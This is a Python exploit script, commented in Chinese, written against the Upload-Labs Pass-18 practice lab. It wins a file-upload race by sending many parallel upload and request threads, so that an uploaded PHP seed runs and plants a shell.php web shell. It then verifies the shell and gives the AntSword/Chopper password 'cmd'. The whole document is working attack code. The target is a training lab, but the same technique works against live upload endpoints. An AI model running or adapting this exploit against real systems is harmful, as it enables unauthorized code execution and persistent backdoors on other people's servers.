import requests
import threading
import os

# 配置目标URL，请根据实际情况修改
TARGET_URL = "http://192.168.80.128/upload-labs/upload/"
UPLOAD_URL = TARGET_URL + "index.php"  # 假设上传入口为 index.php，需根据实际靶场调整
SEED_FILENAME = "seed.php"  # 本地种子文件名
REMOTE_SEED_NAME = "seed.php"  # 上传后的远程文件名
REMOTE_SHELL_NAME = "shell.php"  # 预期生成的后门文件名

# 线程控制
stop_event = threading.Event()
success_count = {"value": 0}


def upload_seed():
    """
    持续上传种子文件，利用 Burp 或此处脚本不断发送上传请求
    """
    while not stop_event.is_set():
        try:
            if not os.path.exists(SEED_FILENAME):
                print(f"[Error] Local file {SEED_FILENAME} not found.")
                stop_event.set()
                break

            with open(SEED_FILENAME, 'rb') as f:
                files = {
                    'upload_file': (REMOTE_SEED_NAME, f, 'application/octet-stream')
                }
                data = {
                    'submit': '上传'  # 根据实际表单字段调整
                }
                # 发送上传请求，不等待响应以提高速度
                requests.post(UPLOAD_URL, files=files, data=data, timeout=1)
        except Exception as e:
            pass


def access_seed():
    """
    持续访问种子文件，触发其执行从而生成 shell.php
    """
    url = TARGET_URL + REMOTE_SEED_NAME
    while not stop_event.is_set():
        try:
            resp = requests.get(url, timeout=1)
            # 如果返回包中包含特定标识，说明执行成功
            if resp.status_code == 200 and "getshell!!!" in resp.text:
                print("\n[Success] Seed executed! Checking for shell...")
                check_shell()
                stop_event.set()
                break
        except Exception as e:
            pass


def check_shell():
    """
    验证 shell.php 是否生成并可访问
    """
    url = TARGET_URL + REMOTE_SHELL_NAME
    try:
        resp = requests.get(url, timeout=2)
        if resp.status_code == 200:
            print(f"[Success] Shell created at: {url}")
            print("[Info] You can now connect using AntSword/Chopper with password: cmd")
        else:
            print("[Warning] Shell access failed, might be deleted or path incorrect.")
    except Exception as e:
        print(f"[Error] Check shell failed: {e}")


def main():
    print("[*] Starting Race Condition Exploit for Upload-Labs Pass-18")
    print(f"[*] Target: {TARGET_URL}")
    print(f"[*] Seed File: {SEED_FILENAME}")

    if not os.path.exists(SEED_FILENAME):
        print(f"[!] Please create {SEED_FILENAME} first with the provided PHP code.")
        return

    # 启动多个上传线程
    upload_threads = []
    for i in range(10):  # 10个上传线程
        t = threading.Thread(target=upload_seed)
        t.daemon = True
        upload_threads.append(t)
        t.start()

    # 启动多个访问线程
    access_threads = []
    for i in range(20):  # 20个访问线程，增加命中概率
        t = threading.Thread(target=access_seed)
        t.daemon = True
        access_threads.append(t)
        t.start()

    try:
        # 主线程等待，直到成功或用户中断
        while not stop_event.is_set():
            import time
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
        stop_event.set()

    print("[*] Done.")


if __name__ == "__main__":
    main()
